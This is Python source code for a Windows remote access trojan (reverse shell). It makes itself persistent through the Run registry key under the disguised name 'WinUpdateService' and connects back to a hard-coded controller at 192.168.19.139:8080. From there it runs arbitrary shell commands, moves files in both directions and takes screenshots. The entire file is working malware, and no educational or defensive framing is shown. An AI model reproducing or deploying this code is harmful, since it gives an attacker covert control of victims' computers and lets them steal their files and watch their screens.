import socket
import os
import subprocess
import ctypes
import platform
import base64
import shutil
import winreg
import pyautogui

def add_to_registry():
    try:
        path = os.path.realpath(__file__)
        name = "WinUpdateService"
        key = winreg.HKEY_CURRENT_USER
        regpath = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        regkey = winreg.OpenKey(key, regpath, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(regkey, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(regkey)
    except:
        pass

def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def connect():
    add_to_registry()
    client = socket.socket()
    client.connect(("192.168.19.139", 8080))

    user = os.getlogin()
    host = platform.node()
    os_name = platform.system()
    privileges = "Admin" if check_admin() else "Standard User"
    client.send(f"Connected to {host} - {os_name} - {user} ({privileges})".encode())

    while True:
        try:
            command = client.recv(4096).decode()

            if command == "terminate":
                break

            elif command == "pwd":
                client.send(os.getcwd().encode())

            elif command == "ls":
                items = os.listdir()
                client.send("\n".join(items).encode())

            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    client.send(f"Changed to {os.getcwd()}".encode())
                except Exception as e:
                    client.send(f"[!] {e}".encode())

            elif command == "checkadmin":
                client.send(f"User has {privileges} privileges".encode())

            elif command.startswith("upload "):
                _, path, b64 = command.split(" ", 2)
                try:
                    with open(path, "wb") as f:
                        f.write(base64.b64decode(b64))
                    client.send(f"Uploaded to {path}".encode())
                except Exception as e:
                    client.send(f"[!] Upload failed: {e}".encode())

            elif command.startswith("download "):
                path = command.split(" ", 1)[1]
                if not os.path.exists(path):
                    client.send(f"[!] File not found: {path}".encode())
                    continue
                client.send(f"[+] Sending {path}".encode())
                with open(path, "rb") as f:
                    b64 = base64.b64encode(f.read())
                client.send(b64 + b"ENDOFFILE")

            elif command == "screenshot":
                img = pyautogui.screenshot()
                img.save("temp_screen.png")
                with open("temp_screen.png", "rb") as f:
                    client.send(f.read() + b"ENDOFFILE")
                os.remove("temp_screen.png")

            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client.send(output if output else b"Command executed (no output)")
                except Exception as e:
                    client.send(f"[!] {e}".encode())

        except Exception as e:
            break

    client.close()

if __name__ == "__main__":
    connect()
